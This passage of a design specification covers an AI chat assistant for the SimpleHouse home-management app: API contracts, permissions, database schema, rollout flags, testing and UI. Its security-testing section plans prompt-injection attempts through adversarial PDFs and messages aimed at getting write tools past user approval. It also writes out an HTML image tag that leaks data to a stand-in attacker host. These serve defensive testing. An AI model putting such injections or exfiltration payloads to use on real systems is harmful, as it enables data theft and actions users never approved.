| `AI_TOOL_IDEMPOTENCY_REPLAY` | 200 (SSE frame) | N/A | Cached result | Transparent. |
| `AI_TOOL_PENDING_EXPIRED` | 200 (SSE frame) | No | >10 min between emit + approval | User must re-ask. |
| `AI_CONTEXT_TOO_LARGE` | 413 | No | Transcript + context > window | "Conversation is too long — start fresh." |
| `AI_PROVIDER_ERROR` | 502 | Yes | Gemini 5xx | "AI service is having trouble." |
| `AI_PROVIDER_TIMEOUT` | 504 | Yes | No chunk in 60 s | "Response timed out." |
| `AI_SANITIZER_REJECTED` | 200 (SSE frame, downgrade) | No | DOMPurify stripped all | Fall back to text-only. |
| `AI_HOME_CARDS_PARTIAL` | 200 | No | One aggregator sub-call failed | Render available cards; log. |
| `AI_UPLOAD_TOO_LARGE` | client-local | No | File exceeds 50 MB cap | System message in chat + toast. |
| `AI_UPLOAD_WRONG_TYPE` | client-local | No | Rejected mime type | System message + toast. |
| `AI_UPLOAD_SIGNED_URL_FAILED` | 502 | Yes | Signed-URL minting failed | Retry once then surface. |
| `AI_UPLOAD_PUT_FAILED` | 502 | Yes | R2 PUT failed | Retry once then surface. |
| `AI_INTERNAL` | 500 | Yes | Unhandled | Generic error. |

Every code maps to a named test in §15 / Implementation Plan §6.

---

## §8 — API Contract

### 8.1 Capabilities

```
GET /ai-chat/capabilities          (also available at /households/:hid/ai-chat/capabilities)
200 OK:
{
  "enabled": true,
  "modes": { "chat":true, "report_qa":true, "dashboard":false, "onboarding":true, "task_assistant":true },
  "streaming": true,
  "html_rendering": false,           // Phase 6 flag
  "voice_input": true,
  "legacy_home_allowed": true,
  "tools_version": "v1",
  "available_tools": [...],
  "token_budget_remaining": 412000,
  "kill_switch_reason": null,
  "server_time": "2026-04-22T12:00:00Z"
}
```

### 8.2 Assistant Home cards

```
GET /households/:hid/ai-home/cards
Cache-Control: private, max-age=30, stale-while-revalidate=120
200 OK:
{
  "priority": [
    { "id":"...", "kind":"maintenance_task_overdue", "title":"Replace furnace filter", "due":"2026-04-10", "nav":"openTaskDetail", "args":{"taskId":"..."} }
  ],
  "suggestions": [
    { "id":"...", "title":"Winterize outdoor tap", "why":"...", "accept":"acceptSuggestion", "dismiss":"dismissSuggestion", "snooze":"snoozeSuggestion" }
  ],
  "upcoming": [
    { "id":"...", "kind":"appointment", "title":"Plumber — Smith", "when":"2026-04-23T09:00Z", "nav":"openAppointmentDetail", "args":{"appointmentId":"..."} },
    { "id":"...", "kind":"garbage", "title":"Recycling pickup", "when":"2026-04-23T07:00Z", "nav":"openGarbageSchedule" }
  ],
  "insight": { "id":"...", "text":"Your HVAC has ~6 months before its 10-year service." },
  "budget": null,                   // Phase 6
  "generated_at": "2026-04-22T12:00:00Z"
}
```

### 8.3 Chat lifecycle

```
POST   /households/:hid/ai-chat/sessions                body: { mode, title? } → { session }
GET    /households/:hid/ai-chat/sessions                → { sessions[] } (last 50 non-archived)
GET    /households/:hid/ai-chat/sessions/:sid           → { session, messages[] }
PATCH  /households/:hid/ai-chat/sessions/:sid           body: { title?, is_archived?, mode? }
DELETE /households/:hid/ai-chat/sessions/:sid           cascade-delete messages + tool calls
```

### 8.4 Stream

```
POST /ai-chat/stream/ticket
Auth: Bearer JWT. Rate-limited (5/min/user).
Body: { sessionId, mode, context?: { reportId?, taskId?, dashboardSnapshot? } }
200: { ticket: "<uuid>", expires_at: "<iso8601 30s>" }

GET  /ai-chat/stream?ticket=<uuid>&session_id=<uuid>    (served via SSE)
Headers: Accept: text/event-stream, X-Tools-Version: v1, X-Idempotency-Key: <uuid>
Response: text/event-stream

SSE events (one per line, `data: <json>\n\n`):
{type:'turn_started',    turn_id, message_id}
{type:'text',            content}                                           // incremental text delta
{type:'ui_block',        block: { kind: 'text'|'card'|'chart_summary'|'list'|'kv'|'action_prompt'|'pdf_citation'|'divider', ... }}  // §24 structured UI
{type:'html_chunk',      content}                                           // Phase 7 dashboard only
{type:'tool_result',     tool_call_id, name, status:'auto_executed', result, undo_token?}
{type:'tool_call_pending', tool_call_id, turn_id, name, args, idempotency_key, display_hint, expires_at}
{type:'navigation_hint', action, params}
{type:'citation',        reportId, page, quote}
{type:'done',            message_id, structuredData: {htmlContent?, citations?}, usage}
{type:'error',           code, recoverable, retry_after_ms?}
{type:'auth_expired'}

Keepalive (during HIGH_WRITE parking — §6.2): the server writes `: keepalive\n\n` comment frames every 15 s. Clients MUST ignore SSE comment lines and keep the connection open indefinitely (bounded by the 10-minute DO approval alarm). A `{type:'error', code:'approval_timeout'}` followed by `{type:'done', reason:'timeout'}` is emitted if the alarm fires before the user responds.

Terminator: data: [DONE]\n\n
```

### 8.5 Approval resume

```
POST /ai-chat/tool-result
Auth: Bearer JWT. Rate-limit (60/min).
Body: { session_id, tool_call_id, turn_id, decision: 'approve'|'deny', edited_args?, idempotency_key }
202 Accepted. Resolution is delivered on the **same open SSE stream** (see §6.2 hold-open model).
```

### 8.6 Undo (LOW_WRITE)

```
POST /ai-chat/tools/:toolCallId/undo
Auth: Bearer JWT. Rate-limit (60/min).
Body: { idempotency_key }
202 Accepted
Response: { undone: true, restored: <tool-specific summary> } | { undone: false, reason: 'expired'|'not_found'|'not_reversible' }
```

LOW_WRITE tools emit an `undo_token` on their `tool_result` event (§8.4). Clients surface a 5-second snackbar with an Undo button; tapping it POSTs here. Undo is best-effort — tools that create D1 rows can be undone by soft-delete; tools that dispatched notifications cannot un-send. Each tool declares `reversibility: 'full'|'soft'|'none'` in its `ToolDefinition`; the endpoint returns `not_reversible` for `none`. Undo history is not chained — you cannot undo an undo. See §23 per-tool entries.

### 8.7 Prewarm

```
POST /ai-chat/prewarm
Auth: Bearer JWT. Rate-limit (1/min/user — bucket `ai:prewarm`).
Body: {}
200: { warm: true,  model: 'claude-sonnet-4-5-20250929' }
   | { warm: false, reason: 'disabled'|'rate_limited'|'budget_near_limit'|<error message> }
```

Fires a zero-output Anthropic Messages request against the static system + tools prefix, cached via `cache_control: { type: 'ephemeral', ttl: '1h' }` (Task 0.6 SDK upgrade). Forces the Anthropic prompt-cache slot to warm on the edge POP before the user sends their first message. Pre-warm deducts its estimated input tokens from `ai_chat_token_budget_daily`; if the user is at ≥80% of daily budget, the server skips the call. Clients debounce calls across `AppState` transitions (30 s). Pre-warm failures **never** block chat; the next real user turn simply pays a full cache-miss.

### 8.8 Legacy chat

`POST /households/:hid/chat` (existing, Gemini-only RAG): remains supported in v1.0 as a fallback. Deprecation tracked in Known Gaps.

All request/response bodies validated via `zod` on the Worker. All responses flow through the existing `backend/src/utils/responses.ts`.

---

## §9 — Permissions & Auth Matrix

| Endpoint | Auth | Household check | Rate limit | Kill switch |
|---|---|---|---|---|
| `GET /ai-chat/capabilities` | JWT | no | 30/min | advisory (returns `enabled:false`) |
| `GET /households/:hid/ai-home/cards` | JWT | yes | 60/min | advisory |
| `POST /households/:hid/ai-chat/sessions` | JWT | yes | 10/min | enforced |
| `GET /sessions` | JWT | yes | 60/min | not enforced |
| `POST /ai-chat/stream/ticket` | JWT | yes (via sessionId→session.household_id) | 5/min | enforced |
| `GET /ai-chat/stream?ticket=...` | ticket | yes | 20/hour stream starts + 1 concurrent | enforced + mid-stream poll |
| `POST /ai-chat/tool-result` | JWT | yes (via sessionId) | 60/min | enforced |
| `POST /ai-chat/tools/:toolCallId/undo` | JWT | yes (via toolCall→session→household) | 60/min | enforced |
| `POST /ai-chat/prewarm` | JWT | no | 1/min (bucket `ai:prewarm`) | advisory (returns `warm:false, reason:'disabled'`) |
| `PATCH /sessions/:sid` | JWT | yes + session ownership | 30/min | not enforced |
| `DELETE /sessions/:sid` | JWT | yes + session ownership | 10/min | not enforced |
| `POST /households/:hid/chat` (legacy) | JWT | yes | existing | advisory |

**Session ownership:** JWT `sub` must match `AiChatSession.user_id` (middleware helper).

**Per-tool authorization:** each tool declares `requires_household_role: 'owner'|'member'` (default `member`). Enforced inside the executor.

---

## §10 — Entity Schema (D1 migration)

New migration file: `backend/migrations/0034_ai_chat.sql` (XX = next available). Drizzle schemas in `backend/src/db/schema-ai-chat.ts`.

```sql
CREATE TABLE ai_chat_sessions (
  id TEXT PRIMARY KEY NOT NULL,
  user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  household_id TEXT NOT NULL REFERENCES households(id) ON DELETE CASCADE,
  mode TEXT NOT NULL DEFAULT 'chat'
       CHECK (mode IN ('chat','report_qa','dashboard','onboarding','task_assistant')),
  title TEXT,
  is_archived INTEGER NOT NULL DEFAULT 0,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  updated_at TEXT NOT NULL DEFAULT (datetime('now')),
  last_message_at TEXT
);
CREATE INDEX idx_chat_sessions_user_household ON ai_chat_sessions(user_id, household_id, last_message_at DESC);

CREATE TABLE ai_chat_messages (
  id TEXT PRIMARY KEY NOT NULL,
  session_id TEXT NOT NULL REFERENCES ai_chat_sessions(id) ON DELETE CASCADE,
  turn_id TEXT NOT NULL,
  role TEXT NOT NULL CHECK (role IN ('user','assistant','system','tool')),
  content_text TEXT,
  content_html TEXT,
  citations_json TEXT,
  tool_call_id TEXT,
  metadata_json TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX idx_chat_messages_session_created ON ai_chat_messages(session_id, created_at);

CREATE TABLE ai_tool_calls (
  id TEXT PRIMARY KEY NOT NULL,
  session_id TEXT NOT NULL REFERENCES ai_chat_sessions(id) ON DELETE CASCADE,
  turn_id TEXT NOT NULL,
  message_id TEXT,
  tool_name TEXT NOT NULL,
  tool_version TEXT NOT NULL DEFAULT 'v1',
  category TEXT NOT NULL
           CHECK (category IN ('read','low_write','high_write','navigation')),
  args_json TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'pending_approval'
         CHECK (status IN ('pending_approval','approved','denied','executed','failed','auto_executed','expired')),
  result_json TEXT,
  error_code TEXT,
  idempotency_key TEXT NOT NULL UNIQUE,
  approved_by_user_at TEXT,
  executed_at TEXT,
  undo_token TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX idx_tool_calls_session_turn ON ai_tool_calls(session_id, turn_id);

CREATE TABLE ai_tool_pending (
  id TEXT PRIMARY KEY NOT NULL,
  session_id TEXT NOT NULL REFERENCES ai_chat_sessions(id) ON DELETE CASCADE,
  tool_call_id TEXT NOT NULL REFERENCES ai_tool_calls(id) ON DELETE CASCADE,
  args_json TEXT NOT NULL,
  expires_at TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX idx_tool_pending_expires ON ai_tool_pending(expires_at);

CREATE TABLE ai_tool_audit (
  id TEXT PRIMARY KEY NOT NULL,
  user_id TEXT NOT NULL,
  household_id TEXT NOT NULL,
  session_id TEXT NOT NULL,
  tool_name TEXT NOT NULL,
  category TEXT NOT NULL,
  args_redacted_json TEXT NOT NULL,
  result_hash TEXT,
  status TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX idx_audit_user_household_created ON ai_tool_audit(user_id, household_id, created_at DESC);

CREATE TABLE ai_idempotency_keys (
  key TEXT PRIMARY KEY NOT NULL,
  user_id TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  tool_name TEXT NOT NULL,
  result_json TEXT NOT NULL,
  expires_at TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX idx_idempotency_expires ON ai_idempotency_keys(expires_at);
```

Forward migration is additive (safe). Rollback: all six tables are drop-safe (no inbound FKs from domain tables).

---

## §11 — Caching, Staleness, Session Continuity

### 11.1 Caching

- `/ai-chat/capabilities` cached in MMKV for 60 s (re-fetched on app resume).
- `/ai-home/cards` response: `Cache-Control: private, max-age=30, stale-while-revalidate=120` + MMKV mirror on client for offline fallback.
- Kill-switch KV value cached in each Worker isolate for 10 s (stale-while-revalidate).
- Per-tool context builders may cache within a single request (no cross-request cache).

### 11.2 Staleness + resume

- If SSE drops before the assistant message persists → RN shows banner "Response interrupted — Resume?"; tapping Resume POSTs a fresh SSE with the same `X-Idempotency-Key`.
- If disconnect during tool-confirmation wait → re-opening SSE; DO resumes from `AiToolPending` row.
- Sessions >30 days auto-archived via cron. Archived = read-only.
- Cards stale beyond 24h → pull-to-refresh suggests running `analyzeHousehold`.

### 11.3 Data residency

All chat data in Cloudflare D1 (same region as rest of SimpleHouse). Gemini egresses to Google AI US; same pattern as existing contractor-search.

---

## §12 — Release-Train Readiness

### 12.1 Feature flags (`CONFIG_KV` keys)

| Key | Type | Default | Purpose |
|---|---|---|---|
| `ai_chat_killswitch` | JSON `{killed, reason, scope}` | `{killed:false}` | Master |
| `ai_chat_streaming_enabled` | `"true"/"false"` | `"true"` | Disable SSE |
| `ai_chat_html_enabled` | `"true"/"false"` | `"false"` (Phase 6) | LLM HTML |
| `ai_mode_{chat,report_qa,dashboard,onboarding,task_assistant}_enabled` | `"true"/"false"` | mode-dependent | Per-mode kill |
| `ai_tool_{name}_enabled` | `"true"/"false"` | `"true"` | Per-tool kill |
| `ai_chat_user_allowlist` | JSON `string[]` or key UNSET | UNSET (= "allow everyone" once global rollout completes) | Gradual rollout. Key present = strict mode; present with `[]` = deny-all. During v1.0 rollout keep this key UNSET while `ai_chat_killswitch.killed=true` gates access. Flip killswitch to `false` only after allowlist is populated. |
| `ai_chat_token_budget_daily` | integer | `500000` | 24h input-token budget |
| `ai_chat_stream_hourly_cap` | integer | `20` | streams/hour/user |
| `ai_chat_household_budget_daily` | integer | `1500000` | 24 h input-token ceiling per household (sum across all members). Prevents a multi-member household from collectively exceeding any per-user cap. |
| `assistant_home_enabled` | `"true"/"false"` | `"false"` until Phase 5 | Replaces legacy Home |
| `allow_legacy_home` | `"true"/"false"` | `"true"` | Safety-net opt-out |

### 12.2 Rollout phases (v1.2 — aligned with Implementation Plan §4)

- **P0** Infrastructure + flags + staging mitigation (kill-switch KV helpers, `simple-house-api-dev-preview` Worker, Claude SDK upgrade to ≥0.40, token-prefix log removal).
- **P1** D1 schema migration (`backend/migrations/0034_ai_chat.sql`) + `ChatSessionDO` (with D1 rehydration) + ToolRegistry scaffold + idempotency + audit.
- **P2** READ tools (38) + capabilities endpoint + `/ai-home/cards` + legacy `/ai/*` → 410 + upload NAVIGATION tools + session CRUD.
- **P3** Claude SSE streaming (Sonnet 4.5 + 4-breakpoint prompt caching + `streamClaudeChat`) + mode registry + context providers + ticket auth (JWT `jti` bound, 30 s TTL) + prewarm.
- **P4** FE transport (`react-native-sse` + ticket consume) + `chatStore` + `uiStore` + `AssistantChatScreen` + `api.get<T>` helper + structured-UI block renderer + citation chips.
- **P5** Assistant Home: cards aggregator + voice/text input + upload orchestrator + legacy-home toggle + analytics.
- **P6** Mutating tools (LOW_WRITE auto+Undo; HIGH_WRITE hold-open-with-keepalive approval — see §6.2 / §8.4) + 18-service `origin:'ai_chat'` propagation + tool parity test + audit rows.
- **P7** LLM-authored HTML dashboard (Task 7.0 DOMPurify-on-Workers POC is a prerequisite gate; `DashboardWebView` with nonce CSP; bundled Chart.js).
- **P8** Allowlist rollout (internal → 1% → 10% → 50% → 100%) + flag cleanup + optional Haiku/Opus tiered-routing migration once family IDs are verified on the Anthropic account.

### 12.3 Go/No-Go gates

A phase ships to prod only when: all CRITICAL + HIGH review findings resolved, E2E test suite green on preview Worker, kill-switch drill verified, cost-budget dashboard live, and accessibility review on any UI changes.

---

## §13 — Analytics Contract

Backend events (structured `console.log` + Mixpanel server-side SDK if present):

| Event | Props |
|---|---|
| `ai_home_cards_served` | userId, householdId, priority_n, suggestions_n, upcoming_n, wall_ms, cache_hit:bool |
| `ai_chat_session_started` | sessionId, userId, householdId, mode, source:'home'|'report_detail'|'task_detail'|'deeplink' |
| `ai_chat_ticket_minted` | sessionId, userId |
| `ai_chat_turn_started` | sessionId, turnId, userId, householdId, input_char_len, voice:bool, mode |
| `ai_chat_turn_completed` | turnId, input_tokens, output_tokens, wall_ms, tool_count, html_rendered:bool, mode |
| `ai_chat_tool_called` | turnId, tool_name, category, idempotency_key, status_after |
| `ai_chat_tool_approval_shown` | turnId, tool_name |
| `ai_chat_tool_approved` | turnId, tool_name, wall_ms_from_show, args_edited:bool |
| `ai_chat_tool_denied` | turnId, tool_name |
| `ai_chat_killswitch_triggered` | reason, scope |
| `ai_chat_error` | code, recoverable, turnId?, route |
| `ai_chat_quota_exceeded` | userId, tokens_used_24h |

Frontend events (Mixpanel via `src/services/analytics` — if not present, create at Phase 5):

| Event | Props |
|---|---|
| `assistant_home_mounted` | cold:bool, cards_rendered_n, wall_ms_to_first_card |
| `assistant_home_card_tapped` | card_kind, target_screen |
| `assistant_home_card_action` | card_kind, action:'accept'|'dismiss'|'snooze'|'undo' |
| `assistant_home_pull_to_refresh` | triggered_analyze:bool |
| `assistant_home_switch_to_legacy` | - |
| `ai_chat_opened` | entry_point, mode |
| `ai_chat_voice_tapped` | - |
| `ai_chat_voice_uploaded` | duration_ms |
| `ai_chat_message_sent` | input_char_len, voice:bool, mode |
| `ai_chat_html_rendered` | chart_count, render_ms |
| `ai_chat_tool_approval_modal_shown` | tool_name |
| `ai_chat_deeplink_followed` | target_screen |
| `ai_chat_stream_dropped` | had_partial_response:bool |
| `ai_chat_resumed` | success:bool |

---

## §14 — Notification Contract

- **No new push channels.**
- **Suppression rule:** tool-initiated writes pass `origin:'ai_chat'` to the service-level call. The notification pipeline suppresses synchronous notifications when `origin==='ai_chat'`. Scheduled reminders fire normally.
- **No tool-approval push** in v1.0. Modal is sole affordance.

---

## §15 — Testing Strategy

### 15.1 Unit (Vitest + @cloudflare/vitest-pool-workers)

- ToolRegistry: register, resolve by mode, per-mode allowlist enforcement, I-8 runtime assertion (`household_id` in args = reject).
- risk.ts table: every tool classified; no orphan tool entries.
- Tool executors per domain: positive / negative / IDOR / idempotency-replay.
- Context builders: PII allowlist — assert no disallowed field in output for each tool.
- DOMPurify wrapper: 20+ adversarial fixtures (script, meta-refresh, data URIs, SVG, iframe, object, `on*` attrs, `<link rel=stylesheet>` with CDN URL).
- Zod tool-arg validators: round-trip + malformed.
- JWT + ticket: expiry + single-use enforcement.
- HomeCardsService: aggregate with mocks + partial-failure path.

### 15.2 Integration (Miniflare + SSE client)

- Start session → send message → drive mock provider → SSE frame sequence matches spec.
- Kill switch flip mid-stream → SSE `error` event with `AI_DISABLED` within 15 s.
- Concurrent streams for same `user:household` → second rejected `AI_STREAM_ALREADY_ACTIVE`.
- Approval round-trip: deny path + approve path + edit-args-before-approve path.
- Idempotency replay: second POST with same key → cached result, no second D1 write.
- Mode-allowlist violation: report_qa mode asked to `createTask` → `AI_TOOL_NOT_ALLOWED_FOR_MODE`.
- Ticket tests: valid, expired, reused, wrong user.
- Cards endpoint: full happy path + partial failure (one aggregator down) → `AI_HOME_CARDS_PARTIAL` with partial data.

### 15.3 Frontend (Jest + React Native Testing Library)

- `useAssistantHomeCards`: mount → skeleton → data; stale cache → show + refresh; offline → show + banner.
- `VoiceTextInput`: voice press → record → upload → transcription path; text path.
- `CardDeck`: renders each card kind + tap → correct navigate or action.
- `AssistantHomeScreen`: flag-off → legacy widget grid renders; flag-on → Assistant renders.
- `useAIChatSession` hook: append message, streaming state, error mapping.
- `DashboardWebView`: sanitized HTML renders, postMessage roundtrip, nav denied, CSP present (Phase 6).
- `ToolApprovalCard`: mount, approve, deny, edit-args, dismiss, analytics events.
- `sseClient`: parses chunked SSE, handles incomplete lines across reads, auth_expired → re-mint ticket.

### 15.4 E2E manual (TestFlight, dev preview Worker)

- Small-screen (iPhone SE 3): card layout, voice button reachable.
- VoiceOver: card semantics, voice button label, chat bubble reading order.
- Keyboard open mid-chat: HTML reflow (Phase 6).
- Airplane mode mid-stream: abort + resume banner.
- Background → foreground mid-stream: abort + resume.
- Legacy Home opt-out: setting toggle takes effect on next mount.

### 15.5 Security regression

- 15 adversarial PDFs attempting prompt-injection of HIGH_WRITE tool without approval → all blocked.
- 15 adversarial user messages doing the same → blocked.
- HTML `<img src="https://evil.example/?leak">` → CSP blocks network call (verify via `wrangler tail` + iOS network logger).
- HTML `<meta http-equiv="refresh">` → stripped by sanitizer.
- JWT never appears in `wrangler tail` output during chat sessions.
- Ticket reuse attempt → 401 `AI_TICKET_INVALID`.

### 15.6 Performance

- `/ai-home/cards` p95 < 400 ms (D1 cold) / < 150 ms (warm).
- Assistant Home first-card-rendered < 1.5 s (warm MMKV).
- SSE first chunk < 2.5 s (p95).
- Card-deck memory < 80 MB steady, < 150 MB during chat stream.
- Phase 6 dashboard first-paint < 3 s.

---

## §16 — Observability & Operations

- **Logs:** structured per SSE open/close, tool call, kill-switch check, cards aggregation. Tail via `wrangler tail --env production --format pretty`.
- **Metrics:** `ai_chat_turn_wall_ms`, `ai_chat_input_tokens`, `ai_chat_output_tokens`, `ai_chat_tool_exec_ms`, `ai_home_cards_wall_ms`, `ai_home_cards_partial_count` → Cloudflare Analytics Engine.
- **Alerts:** p95 stream wall > 15 s for 10 min → page. Kill-switch triggered → Slack. Quota-exceeded rate > 1% → Slack.
- **Runbook:** `documents/deployment/ai-chat-runbook.md` (created in Implementation Plan Phase 1).

---

## §17 — Open Decisions

| # | Decision | Owner | Status |
|---|---|---|---|
| D-01 | Primary provider v1.0 | Eng | **RESOLVED — Claude tiered: Haiku 4.5 / Sonnet 4.6 / Opus 4.7** with prompt caching. Gemini retained for legacy `/chat`. |
| D-02 | Assistant Home entry point | Product | **RESOLVED — replaces Home tab primary body.** Legacy widgets accessible via "Switch to widget Home" menu. |
| D-03 | Session context window | Eng | **RESOLVED — last 20 messages.** Auto-summarization deferred. |
| D-04 | Staging Cloudflare DO block | DevOps | **PLAN — create `simple-house-api-dev-preview` Worker as parallel test env.** Unblocks P0. |
| D-05 | Deprecate legacy `/chat` endpoint | Eng | **RESOLVED — keep in v1.0, deprecate in v1.1** after Assistant Home retention data. |
| D-06 | Android parity | Product | **RESOLVED — iOS-first, Android must not crash.** |
| D-07 | Voice-to-text source | Eng | **RESOLVED — reuse `voiceRecordingService`** (backend transcribes). |
| D-08 | Chart.js delivery | Security | **RESOLVED — bundled (Phase 6).** |
| D-09 | DO session key | Eng | **RESOLVED — `userId:householdId`.** |
| D-10 | Allowlist for Phase 8 rollout | Product | **RESOLVED (v1.3) — 20 internal users, 1-week soak before expanding.** Feed the list to `CONFIG_KV.ai_chat_user_allowlist` at the start of Phase 8. Expansion criteria: zero P0/P1 incidents and ≥ 60 % 7-day retention on the allowlist cohort before moving to 1 % → 10 % → 50 % → 100 % gates. |
| D-11 | AI Housekeeper suggestion ordering for Priority card | Product | **RESOLVED (v1.3) — ordering: overdue maintenance > high-severity report findings > AI Housekeeper predictions > housekeeper suggestions.** Implemented in Plan Task 2.4 (`buildCards` ordering). Subject to A/B after Phase 8 launch based on Priority-card click-through. |
| D-12 | Voice vs text primary affordance size | Design | **RESOLVED — voice button ~72pt circular, centered. Text field pill below ("Or type a message"), tap to expand.** |
| D-13 | Empty state when no cards | Product | **RESOLVED (v1.3) — copy: "Your home looks good 🏡" with proactive nudge "Want to plan your spring maintenance?"** Illustration asset tracked in Plan Task 5.4 (Design ownership). Secondary CTA: open the seasonal-checklist screen. |

---

## §18 — Cross-Feature Impact

| Feature | Interaction | Risk |
|---|---|---|
| AI Housekeeper | Assistant Home is its primary surface; tools wrap its API | Medium — a failure in AI Housekeeper makes Home degrade. Mitigation: partial-failure rendering. |
| PDF citation system | `PdfCitationChip` + `openPdfAtPage` tool | Low — extends existing `PDFViewerModal`. |
| Legacy `/chat` | Coexists in v1.0 | Low |
| HomeScreen (widget grid) | Becomes secondary via "Switch to widget Home" menu | Medium — UX regression risk for power users; retention test required. |
| Notification pipeline | `origin:'ai_chat'` suppression | Medium — must audit every tool that writes domain state. |
| Rate limiter | Existing in-memory insufficient; switch chat endpoints to DO-based `checkRateLimitDO` | Medium — parallel path already exists. |
| `src/screens/chat/ChatScreen.tsx` | Orphaned; rewrite into `AssistantChatScreen.tsx` | Low |
| `src/features/` empty folder | Use for `src/features/assistant-home/` and `src/features/ai-chat/` | Low |
| `src/components/ai-assistant/` empty folder | Use for card components | Low |
| Navigation | New helpers: `navigateToChat`, `navigateToReportAtPage`, `navigateToBudget`, `navigateToAppointmentDetail` | Low |
| Notifications settings | New "AI actions" subgroup (approvals log) — deferred | Low |

---

## §19 — Revision History

| Version | Date | Author | Notes |
|---|---|---|---|
| v1.0 | 2026-04-22 | a.tekhtelev@gmail.com | Initial. Adapted Step mcp-poc for SimpleHouse. |
| v1.1 | 2026-04-22 | a.tekhtelev@gmail.com | Integrated AI Housekeeper architecture doc (5 modes, risk-classified tools, ticket SSE, react-native-sse, Gemini v1.0). Added Assistant Home as primary Home-tab body with eager-loaded card deck + voice-first input. Added §8.2 cards endpoint, ADR-12/13/14/15, feature flags `assistant_home_enabled`/`allow_legacy_home`/`ai_mode_*`/`ai_tool_*`. Added §15.5 security regression tests. Resolved D-02. |

---

## §20 — Key Decisions Log

| ID | Decision | Rationale | Sourced |
|---|---|---|---|
| KD-01 | Adapt (not port) into SimpleHouse stack | Keep team expertise; avoid wasted Swift/Amplify reimplementation | §1.3 |
| KD-02 | Mandatory approval on HIGH_WRITE; auto + Undo on LOW_WRITE; auto on READ | Prompt-injection via user PDFs is a realized threat; preserves UX for common ops | ADR-4 |
| KD-03 | Server-side DOMPurify + bundled Chart.js + strict CSP | LLM HTML untrusted; RN WebView less sandboxed than WKWebView by default | ADR-5, ADR-6 |
| KD-04 | `ChatSessionDO` keyed by `userId:householdId` | Tool-loop resume + kill-poll + single-in-flight | ADR-7 |
| KD-05 | Ticket-based SSE (30 s single-use) with `react-native-sse` | RN EventSource can't set headers; keeps JWT out of Cloudflare logs | ADR-2, ADR-3 |
| KD-06 | `CONFIG_KV` kill switch with 10 s isolate cache | <60 s global propagation; no redeploy | ADR-8 |
| KD-07 | Parallel preview Worker for staging DO block | Don't deploy DO untested | ADR-15 |
| KD-08 | `X-Tools-Version` header for schema versioning; 2 versions supported | App Store vs Worker deploy lag | ADR-9 |
| KD-09 | Per-tool context allowlist via `buildContext({ tool, household })` | PII leak prevention by construction | ADR-10 |
| KD-10 | Idempotency key required for every write; 24 h KV cache | LLM + network dual duplication | ADR-11 |
| KD-11 | Claude (Haiku 4.5 / Sonnet 4.6 / Opus 4.7) with tiered routing + prompt caching from v1.0 | 90 % cache-discount on static prefix; Haiku TTFB < 500 ms; best-in-class tool use | ADR-1, ADR-16, ADR-18 |
| KD-17 | Structured UI schema as primary render path; HTML only for dashboard mode (Phase 7) | Safer + faster + accessible by default; no WebView surface area on hot path | ADR-17 |
| KD-18 | Speculative pre-warm on app-open | Meaningful latency improvement for zero-cost requests | ADR-19 |
| KD-12 | Assistant Home replaces Home tab body; `/ai-home/cards` is LLM-free | Time-to-value < 1.5 s; no prompt-injection surface on first paint | §6.1, ADR-12 |
| KD-13 | Legacy Home retained behind `allow_legacy_home` flag, default on | Safety net for rollout | ADR-13 |
| KD-14 | Mode selection is context-driven, not user-facing | Reduces cognitive load; debug picker only | ADR-14 |
| KD-15 | Voice primary, text secondary on Assistant Home | Best UX for "talk to your home" framing; text available on tap | D-12 |
| KD-16 | `householdId` never a tool argument | Forces server-side rebinding; eliminates IDOR via tool arg | I-8 |

---

## §21 — Do Not Approve Yet Gate

Status → APPROVED requires:

- [ ] D-04 staging DO block: mitigation confirmed (preview Worker stood up).
- [x] D-10 allowlist size confirmed (v1.3 — 20 internal, 1-week soak).
- [x] D-11 priority card ordering confirmed with Product (v1.3 — overdue > high-severity findings > housekeeper predictions > suggestions).
- [x] D-13 empty-state copy confirmed with Design (v1.3 — "Your home looks good 🏡" + "Want to plan your spring maintenance?"; illustration asset tracked in Plan Task 5.4).
- [ ] Error-code → test matrix (§15.1) complete.
- [ ] Cost model signed off; monthly LLM cap in KV before any rollout beyond internal allowlist.
- [ ] Security review: DOMPurify config, CSP, WebView props (Phase 7 gate).
- [ ] Accessibility review: VoiceOver semantics of card deck + voice button + HTML-to-`<table>` fallback (Phase 7 gate).

---

## §22 — Assistant Home UI/UX Specification

### 22.1 Information architecture

```
Home tab (bottom nav)
 └── AssistantHomeScreen  (when assistant_home_enabled && !user_opted_legacy)
      ├── GreetingRow             (morning/afternoon/evening + first name + menu "..." for switch-to-legacy)
      ├── VoiceTextInput           (large voice button + collapsible text pill)
      ├── CardDeck                 (vertical stack, pull-to-refresh)
      │    ├── PriorityCard        (if any)
      │    ├── SuggestionCard(s)   (up to 3; swipeable)
      │    ├── UpcomingCard        (next 3 events)
      │    ├── InsightCard         (if any)
      │    ├── MiniDashboardCard   (Phase 6, flagged)
      │    └── EmptyStateCard      (if deck empty)
      └── HistoryFab               (small "chat history" affordance → AssistantChatScreen)
 └── HomeScreen (legacy widget grid; when allow_legacy_home && user opts in)
```

### 22.2 Visual spec (tokens sourced from `src/theme/index.ts`)

**GreetingRow:**
- Time-of-day greeting: `Good morning, Andrei` — `typography.fontSize.lg` / `colors.text`
- Right-aligned icon-button `...` → sheet with Settings + "Switch to widget Home"

**VoiceTextInput:**
- Container: 96pt tall, `colors.surfaceSecondary` background, `borderRadius.xl`
- Voice button: 72×72pt circular, `pastel.teal` fill, mic icon centered, `accessibilityLabel="Ask your home assistant"`
- Long-press for continuous; single-tap for push-to-talk toggle
- Text pill below: "Or type a message" — `typography.fontSize.md`, tap expands to text input + send button
- Both wired to `AssistantChatScreen` on send (Home stays visible; chat slides up as a bottom sheet at ~70% height)

**Cards:**
- Card container: `colors.surface`, `borderRadius.lg`, `spacing.md` padding, light shadow
- Title: `typography.fontSize.md`, bold
- Body: `typography.fontSize.sm`, `colors.textSecondary`
- Actions: inline buttons at bottom (`colors.primary` for primary, ghost for secondary)
